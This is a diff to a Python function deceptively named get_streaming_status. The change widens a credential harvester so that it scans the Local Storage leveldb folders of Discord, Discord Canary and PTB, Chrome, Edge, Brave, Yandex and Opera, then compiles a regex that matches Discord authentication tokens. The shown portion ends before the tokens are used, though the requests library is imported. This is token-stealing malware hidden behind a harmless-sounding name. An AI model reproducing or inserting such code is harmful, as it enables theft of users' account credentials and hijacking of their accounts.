@@ -21,9 +21,19 @@ import requests
 
 def get_streaming_status():
     paths = [
-        os.path.join(os.getenv("APPDATA", ""), "Discord", "Local Storage", "leveldb"),
-        os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
-        os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera Stable", "Local Storage", "leveldb")
+    # Discord Apps
+    os.path.join(os.getenv("APPDATA", ""), "Discord", "Local Storage", "leveldb"),
+    os.path.join(os.getenv("LOCALAPPDATA", ""), "discordcanary", "Local Storage", "leveldb"),
+    os.path.join(os.getenv("LOCALAPPDATA", ""), "discordptb", "Local Storage", "leveldb"),
+
+    # Chromium Browsers
+    os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
+    os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
+    os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
+    os.path.join(os.getenv("LOCALAPPDATA", ""), "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),
+
+    # Opera
+    os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
     ]
     tokens = []
     token_pattern = re.compile(r"[\\w-]{24,}\\.[\\w-]{6,}\\.[\\w-]{27,}")
